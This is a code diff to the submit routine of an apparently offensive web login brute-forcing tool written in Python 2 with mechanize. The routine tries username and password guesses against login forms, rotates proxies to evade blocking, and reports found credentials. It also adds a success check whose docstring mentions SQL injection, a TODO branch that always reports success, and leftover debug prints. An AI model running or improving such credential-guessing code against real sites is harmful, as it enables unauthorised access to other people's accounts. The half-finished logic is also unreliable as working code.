@@ -1,6 +1,29 @@
 import mechanize
 from core import utils, actions, tbrowser		
 
+
+def check_condition(options, proc, loginInfo):
+
+	"""
+		Check logged in successfully condition.
+		This function will check SQL injection as well
+			return 0 -> False
+			return 1 -> True
+			return 2 -> Should be SQL Injection error-based
+	"""
+	if options.panel_url:
+		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
+		proc.open(options.panel_url)
+		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
+			return 1
+		else:
+			return 0
+	else:
+		# User provided direct login URL (/wp-login.php).
+		# TODO improve this condition
+		return 1
+
+
 def submit(options, loginInfo, tryCred, result):
 
 	#	Get login form field informations
@@ -10,25 +33,23 @@ def submit(options, loginInfo, tryCred, result):
 	tryPassword, tryUsername = tryCred
 	
 	proc = tbrowser.startBrowser()
-
-	#user_agent = tbrowser.useragent()
 	
 	for cred in list(result.queue):
 		if "--reauth" not in options.extras:
 			if tryUsername == cred[0]:
-				return 0 # don't run if find password of username
+				return True # don't run if find password of username
 		else:
 			if tryUsername == cred[1]:
-				return 0 # don't run if find password of username
+				return True # don't run if find password of username
 	
 	if options.proxy:
-		#Set proxy connect
+		# Set proxy connect
 		proxyAddr = actions.randomFromList(options.proxy)
 		proc.set_proxies({"http": proxyAddr})
 	
 	try:
 
-		proc.open(options.url)
+		proc.open(options.login_url)
 		title = proc.title()
 
 		#	Select login form
@@ -55,48 +76,71 @@ def submit(options, loginInfo, tryCred, result):
 					[tryUsername, tryPassword]),
 				'norm')
 		
-		#	Reload - useful for redirect to dashboard
+		#	Reload the browser. For javascript redirection and others...
 		proc.reload()
 		#	If no login form -> success
 		#	TODO improve condition to use captcha
 		
 		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
-			
-			#proc.reload() #proc.open(options.url)
-			# Reopen index url, if no login form -> loged in (??)
-			# BUG: if url is login url (not index), this might not work
-			# how about blocked messages?
-			
-			proc.reload()
-
 			#if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
-			if title != proc.title():
-				utils.printf("[*] Get page: ['%s']" %(proc.title()), "good")
-				if tryUsername:
-					utils.printf("[*] Match found: %s" %(
-						[tryUsername, tryPassword]),
-					"good")
+			# if check_condition():
+			# if options.panel_url:
+			# 	proc.open(options.panel_url)
+			# 	if not loginInfo:
+			# 		print "Success"
+			# 	else:
+			# 		print "Failed"
+			# else:
+			# 	print "Success"
+			test_result = check_condition(options, proc, loginInfo)
 
+			if test_result:
+				utils.printf("[*] Get page: ['%s']" %(proc.title()), "good")
+				
+				# "If we tried login form with username+password field"
+				if tryUsername:
+					utils.printf("[*] Match found: %s" %([tryUsername, tryPassword]), "good")
+				# "Else If we tried login form with password field only"
 				else:
 					utils.printf("[*] Password found: %s" %([tryPassword]), "good")
-
+				# "End of condition block"
+				
+				# "Check for Extras option reauth", return result w/ right format
 				if "--reauth" not in options.extras:
 					result.put([tryUsername, tryPassword])
 				else:
 					result.put([options.url.split("/")[2], tryUsername, tryPassword])
 				
+				### DEBUG ###
+				print "Debug: %s" %(proc.geturl())
+				proc.open(options.url)
+				if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
+					print "Debug: No [login field]"
+				else:
+					print "Debug: Found [login field]"
+				### End Debug ###
 			
 			else:
-				# IF USER PROVIDES INDEX URL, THIS CONDITION IS USAULLY TRUE
-				# IF USER PROVIDES LOGIN URL, THIS CONDITION WILL NOT TRUE
+				# Possibly Error. But sometime it is true
 				utils.printf("[x] Possibly error %s" %(
 					[tryUsername, tryPassword]),
 				"bad")
 				utils.printf("[*] Get page: ['%s']" %(proc.title()), "bad")
 				if options.verbose:
 					utils.printf("[*] %s" %(proc.title()), "good")
+				
+				
+				### DEBUG ###
+				print "Debug: %s" %(proc.geturl())
+				proc.open(options.url)
+				if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
+					print "Debug: No login field"
+				else:
+					print "Debug: Found login field"
+				### End Debug ###
 
 		else:
+			# "Login form is still there. Oops"
 			if options.verbose:
 				if options.proxy:
 					utils.printf("[-] Failed: %s through %s" %(
@@ -109,13 +153,13 @@ def submit(options, loginInfo, tryCred, result):
 					"bad")
 
 	except mechanize.HTTPError as error:
+		# TODO get HTTP error code, show err msg as return code
 		#	Get blocked
 		if options.verbose:
 			utils.printf("[x] Attacking: %s %s" %(
 				error,
 				[tryUsername, tryPassword])
 			, "bad")
-		return False
 
 	except Exception as error:
 		if options.verbose:
@@ -123,8 +167,6 @@ def submit(options, loginInfo, tryCred, result):
 				error,
 				[tryUsername, tryPassword]),
 			"bad")
-		return False
 		
 	finally:
 		proc.close()
-		return True
